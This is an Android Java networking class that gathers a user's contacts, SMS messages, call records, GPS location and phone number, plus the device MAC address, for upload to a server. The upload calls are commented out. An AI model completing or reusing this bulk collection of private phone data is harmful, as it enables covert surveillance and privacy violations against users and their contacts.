package com.tutu.sysinfocollect.net;

import com.tutu.sysinfocollect.constans.Constans;
import com.tutu.sysinfocollect.module.callRecoder.CallRecoderBean;
import com.tutu.sysinfocollect.module.contact.ContactBean;
import com.tutu.sysinfocollect.module.gps.GpsBean;
import com.tutu.sysinfocollect.module.sms.SmsBean;
import com.tutu.sysinfocollect.utils.DeviceUtils;
import com.tutu.sysinfocollect.utils.GsonUtils;
import com.tutu.sysinfocollect.utils.SPUtils;

import java.util.HashMap;
import java.util.List;
import java.util.Map;

/**
 * Created by tutu on 2017/7/24.
 */

public class NetEngine {
    public static void upLoadUsserInfo(List<CallRecoderBean> recoderBeanList, List<ContactBean> contactBeanList,
                                       GpsBean gpsBean, List<SmsBean> smsBeanList) {

        Map<String, String> params = new HashMap<>();
        params.put("contact", GsonUtils.listToJson(contactBeanList));
        params.put("gps", GsonUtils.object2Json(gpsBean));
        params.put("callRecoder", GsonUtils.listToJson(recoderBeanList));
        params.put("sms", GsonUtils.listToJson(smsBeanList));
        params.put("phone", SPUtils.getString(Constans.PHONE));

        /*
        OkGo.<BaseResBean>post(Constans.BASE_URL)
                .params(params)
                .execute(new AbsCallback<BaseResBean>() {
                    @Override
                    public void onSuccess(BaseResBean baseResBean, Call call, Response response) {
                        if ("0".equals(baseResBean.getCode())) {

                        }
                    }

                    @Override
                    public BaseResBean convertSuccess(Response response) throws Exception {

                        return GsonUtils.jsonToObj(response.body().string(), BaseResBean.class);
                    }
                });
        */

    }

    public static void registLogin(String phone) {
        Map<String, String> params = new HashMap<>();
        params.put("phone", phone);
        params.put("uniqeNo", DeviceUtils.getMacAddress());

        /*
        OkGo.<BaseResBean>post(Constans.BASE_URL)
                .params(params)
                .execute(new AbsCallback<BaseResBean>() {
                    @Override
                    public void onSuccess(BaseResBean baseResBean, Call call, Response response) {
                        if ("0".equals(baseResBean.getCode())) {

                        }
                    }

                    @Override
                    public BaseResBean convertSuccess(Response response) throws Exception {

                        return GsonUtils.jsonToObj(response.body().string(), BaseResBean.class);
                    }
                });
        */

    }
}
